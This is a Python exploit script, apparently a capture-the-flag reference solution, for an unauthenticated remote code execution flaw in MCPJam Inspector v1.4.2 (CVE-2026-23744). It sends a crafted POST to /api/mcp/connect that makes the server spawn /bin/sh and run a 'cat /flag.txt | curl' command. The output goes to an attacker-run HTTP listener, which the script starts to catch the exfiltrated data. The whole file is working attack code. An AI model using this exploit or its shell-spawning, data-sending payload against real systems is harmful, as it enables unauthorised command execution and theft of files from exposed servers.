#!/usr/bin/env python3
"""
Reference exploit for "Jam Session" — MCPJam Inspector v1.4.2 RCE (CVE-2026-23744).

The `/api/mcp/connect` endpoint launches a configured "stdio" MCP server by
spawning `serverConfig.command` with `serverConfig.args` — unauthenticated, no
validation. We point it at `/bin/sh -c '<exfil>'` instead of a real MCP server.

The command runs but its output never comes back over the HTTP response (the
connect just reports a failed MCP handshake), so this is *blind* RCE: we exfil
`/flag.txt` to a listener we control.

Usage:
    ./solve.py http://<host>:6274 --lhost <your-ip> --lport 4444

`--lhost` is an address the target can reach back on (your machine's IP on the
CTF network). On localhost you can use the Docker bridge gateway.
"""

import argparse
import http.server
import json
import socketserver
import sys
import threading
import time
import urllib.request

CAUGHT = {"flag": None}


class Catcher(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace").strip()
        if body and CAUGHT["flag"] is None:
            CAUGHT["flag"] = body
        self.send_response(200)
        self.end_headers()

    def log_message(self, *_):  # keep the listener quiet
        pass


def start_listener(port):
    httpd = socketserver.TCPServer(("0.0.0.0", port), Catcher)
    httpd.allow_reuse_address = True
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def exploit(target, lhost, lport):
    exfil = f"cat /flag.txt | curl -s --data-binary @- http://{lhost}:{lport}/"
    payload = {
        "serverId": "maintenance",
        "serverConfig": {
            "command": "/bin/sh",
            "args": ["-c", exfil],
            "env": {},
        },
    }
    req = urllib.request.Request(
        target.rstrip("/") + "/api/mcp/connect",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /api/mcp/connect -> {r.status}: {r.read().decode()[:200]}")
    except urllib.error.HTTPError as e:
        # A failed MCP handshake is HTTP 500 — expected for a blind command.
        print(f"[*] /api/mcp/connect -> {e.code}: {e.read().decode()[:200]}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?", default="http://127.0.0.1:6274")
    ap.add_argument("--lhost", required=True, help="address the target reaches you on")
    ap.add_argument("--lport", type=int, default=4444)
    args = ap.parse_args()

    print(f"[*] listener on 0.0.0.0:{args.lport} (target dials back to {args.lhost})")
    httpd = start_listener(args.lport)

    print(f"[*] firing exploit at {args.target}")
    exploit(args.target, args.lhost, args.lport)

    for _ in range(100):
        if CAUGHT["flag"]:
            break
        time.sleep(0.1)
    httpd.shutdown()

    if CAUGHT["flag"]:
        print(f"[+] FLAG: {CAUGHT['flag']}")
        return 0
    print("[-] no callback received — check --lhost reachability from the target")
    return 1


if __name__ == "__main__":
    sys.exit(main())
